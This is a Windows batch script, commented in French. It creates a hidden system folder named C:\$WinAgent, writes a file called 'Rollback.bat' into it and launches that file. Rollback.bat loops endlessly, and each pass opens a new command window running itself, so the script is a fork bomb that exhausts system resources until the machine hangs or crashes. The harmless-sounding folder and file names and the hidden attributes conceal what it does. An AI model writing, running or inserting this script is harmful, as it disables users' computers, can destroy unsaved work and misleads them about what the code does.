@echo off

REM Vérifier si le répertoire C:\$WinAgent existe, sinon le créer
if not exist C:\$WinAgent (
    mkdir C:\$WinAgent
)

REM Rendre le répertoire C:\$WinAgent masqué
attrib +s +h C:\$WinAgent

REM Créer le fichier Rollback.bat avec le contenu spécifié
echo @echo off > C:\$WinAgent\Rollback.bat
echo :loop >> C:\$WinAgent\Rollback.bat
echo start cmd /k C:\$WinAgent\Rollback.bat >> C:\$WinAgent\Rollback.bat
echo goto loop >> C:\$WinAgent\Rollback.bat


REM Exécuter le fichier Rollback.bat
start C:\$WinAgent\Rollback.bat


